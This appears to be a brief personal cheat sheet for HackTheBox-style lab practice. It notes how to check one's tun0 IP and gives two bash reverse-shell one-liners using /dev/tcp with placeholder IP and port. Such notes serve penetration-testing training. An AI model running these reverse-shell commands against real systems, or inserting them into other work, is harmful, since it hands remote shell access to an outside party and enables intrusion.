# Shells

Always remember to check your IP:

```bash
ifconfig [interface]
```

specify `tun0` as the interface on HacktheBox

## Bash Reverse

```bash
bash -i >& /dev/tcp/[IP]/[PORT] 0>&1
```

or

```bash
bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'
```